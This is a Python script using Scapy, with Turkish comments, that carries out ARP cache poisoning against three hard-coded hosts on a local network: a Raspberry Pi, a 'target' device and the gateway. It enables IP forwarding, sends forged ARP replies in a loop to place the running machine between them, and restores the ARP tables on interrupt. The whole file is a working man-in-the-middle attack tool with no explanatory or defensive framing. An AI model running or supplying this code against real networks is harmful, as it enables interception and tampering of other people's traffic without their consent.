

import scapy.all as scapy
import time
import os
import sys

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered = scapy.srp(packet, timeout=2, verbose=False)[0]
    return answered[0][1].hwsrc if answered else None

def get_my_mac():
    """Kendi MAC adresini al"""
    return scapy.get_if_hwaddr("eth0")

def spoof(target_ip, spoof_ip, target_mac, my_mac):
    """Ethernet katmanını da belirterek ARP spoofing"""
    ether = scapy.Ether(dst=target_mac, src=my_mac)
    arp = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=my_mac)
    packet = ether / arp
    scapy.sendp(packet, verbose=False)

def restore(dest_ip, src_ip, dest_mac, src_mac):
    ether = scapy.Ether(dst=dest_mac, src=src_mac)
    arp = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    packet = ether / arp
    scapy.sendp(packet, count=4, verbose=False)

def main():
    rpi_ip = "172.20.10.14"
    hedef_ip = "172.20.10.12"
    gateway_ip = "172.20.10.1"
    
    print("""

  RPi    : 172.20.10.14
  Hedef  : 172.20.10.12
  Gateway: 172.20.10.1
                       """)
    
    # IP forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    # MAC adreslerini al
    my_mac = get_my_mac()
    print(f"[+] Kendi MAC: {my_mac}")
    
    rpi_mac = get_mac(rpi_ip)
    hedef_mac = get_mac(hedef_ip)
    gateway_mac = get_mac(gateway_ip)
    
    print(f"[+] RPi MAC: {rpi_mac}")
    print(f"[+] Hedef MAC: {hedef_mac}")
    print(f"[+] Gateway MAC: {gateway_mac}")
    print("[+] ARP spoofing başladı (0.2 saniye aralıkla)\n")
    
    sent = 0
    try:
        while True:
            # RPi'yi zehirle: "gateway ve hedef = ben"
            spoof(rpi_ip, gateway_ip, rpi_mac, my_mac)
            spoof(rpi_ip, hedef_ip, rpi_mac, my_mac)
            
            # Hedef cihazı zehirle: "RPi ve gateway = ben"
            spoof(hedef_ip, rpi_ip, hedef_mac, my_mac)
            spoof(hedef_ip, gateway_ip, hedef_mac, my_mac)
            
            # Gateway'i zehirle: "RPi ve hedef = ben"
            spoof(gateway_ip, rpi_ip, gateway_mac, my_mac)
            spoof(gateway_ip, hedef_ip, gateway_mac, my_mac)
            
            sent += 6
            print(f"\r[+] Paket gönderildi: {sent}", end="")
            time.sleep(0.2)
            
    except KeyboardInterrupt:
        print("\n\n[-] Temizleniyor...")
        restore(rpi_ip, gateway_ip, rpi_mac, gateway_mac)
        restore(rpi_ip, hedef_ip, rpi_mac, hedef_mac)
        restore(hedef_ip, rpi_ip, hedef_mac, rpi_mac)
        restore(hedef_ip, gateway_ip, hedef_mac, gateway_mac)
        restore(gateway_ip, rpi_ip, gateway_mac, rpi_mac)
        restore(gateway_ip, hedef_ip, gateway_mac, hedef_mac)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[+] ARP tabloları eski haline döndürüldü")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] Root yetkisi gerekli!")
        sys.exit(1)
    main()
